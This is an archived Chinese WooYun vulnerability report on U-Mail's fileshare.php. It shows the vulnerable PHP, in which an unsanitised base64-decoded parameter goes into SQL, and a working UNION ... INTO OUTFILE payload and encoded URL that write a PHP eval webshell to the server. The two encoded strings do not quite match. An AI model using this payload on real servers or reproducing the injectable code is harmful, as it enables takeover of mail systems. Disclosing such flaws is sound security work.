@@ -1,0 +1,265 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		u-mail注入导致任意代码执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		u-mail注入导致任意代码执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/西毒">西毒</a> 
+</li><li>提交时间：		2013-11-20 17:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-20：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-02-18：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail"></p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">u-mail注入导致任意代码执行漏洞<br />
+<br />
+U mail 邮件系统涉及金融、政府、银行，石油、军队、证券、设置是国家外交部重要部门等。所以漏洞危害可想而知。<br />
+<br />
+<br />
+<br />
+具体漏洞细节如下<br />
+<br />
+<br />
+<br />
+在fileshare.php中<br />
+<br />
+<br />
+<br />
+ <br />
+<br />
+<br />
+<br />
+mysql_query( &quot;SET NAMES &#039;UTF8&#039;&quot;);<br />
+<br />
+<br />
+<br />
+mysql_select_db( $database );<br />
+<br />
+<br />
+<br />
+$file_id = $_GET[&#039;file&#039;];<br />
+<br />
+<br />
+<br />
+$inmail = $_GET[&#039;inmail&#039;];<br />
+<br />
+<br />
+<br />
+if ( !$file_id )<br />
+<br />
+<br />
+<br />
+{<br />
+<br />
+<br />
+<br />
+                   exitout(&quot;鍙傛暟閿欒锛? );<br />
+<br />
+<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+$file_id = rawurldecode( base64_decode($file_id ) );<br />
+<br />
+<br />
+<br />
+$sql = &quot;SELECT * FROM netfile_fileWHERE file_id=&#039;&quot;.$file_id.&quot;&#039; AND is_share=&#039;1&#039;&quot;;<br />
+<br />
+<br />
+<br />
+$file = @mysql_fetch_assoc( @mysql_query($sql ) );<br />
+<br />
+<br />
+<br />
+if ( !$file )<br />
+<br />
+<br />
+<br />
+{<br />
+<br />
+<br />
+<br />
+                   exitout(&quot;鏃犳鍏变韩鏂囦欢锛? );<br />
+<br />
+<br />
+<br />
+}<br />
+<br />
+<br />
+<br />
+ <br />
+<br />
+<br />
+<br />
+由于file 参数未进行任何过滤，经过一次base64_decode解密，导致我们可以将单引号等危险参数传进来，由于屏蔽了回显，所以没办法直接用工具注入<br />
+<br />
+<br />
+<br />
+但是我们通过Mysql 数据查看netfile_file表的结果，发现他有14个字段<br />
+<br />
+<br />
+<br />
+所以我们可以直接union 直接写shell <br />
+<br />
+<br />
+<br />
+当$file_id 经过解密时候为<br />
+<br />
+<br />
+<br />
+aa&#039; union select 1,2,3,4,5,6,&#039;&lt;?phpeval($_POST[cmd]);?&gt;&#039;,8,9,10,11,12,13,14 into outfile&#039;C:/umail/WorldClient/html/360.php&#039;# 即可写shell了<br />
+<br />
+<br />
+<br />
+我们加密下<br />
+<br />
+<br />
+<br />
+YWEnIHVuaW9uIHNlbGVjdCAxLDIsMyw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNCBpbnRvIG91dGZpbGUgJ0M6L3VtYWlsL1dvcmxkQ2xpZW50L2h0bWwvMzYwLnBocCcj<br />
+<br />
+<br />
+<br />
+当http://192.168.56.128/webmail/fileshare.php?file=YWEnIHVuaW9uIHNlbGVjdCAxLDIsMyw0LDUsNiwnPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4nLDgsOSwxMCwxMSwxMiwxMywxNCBpbnRvIG91dGZpbGUgJ0M6L3VtYWlsL1dvcmxkQ2xpZW50L2h0bWwvMzYwLnBocCcj<br />
+<br />
+<br />
+<br />
+即可在web目录写下我们的文件360.php 文件了<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/20164551010a93848b5e80e24ad14d614ca38af6.jpg" target="_blank"><img src="../images/20164551010a93848b5e80e24ad14d614ca38af6.jpg" alt="`5GI@$P3{A)}[DCU4X[TTRR.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/20164551010a93848b5e80e24ad14d614ca38af6.jpg" target="_blank"><img src="../images/20164551010a93848b5e80e24ad14d614ca38af6.jpg" alt="`5GI@$P3{A)}[DCU4X[TTRR.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">这个就加防注入吧 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/西毒" title="西毒">西毒</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043493" title="u-mail注入导致任意代码执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43493";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
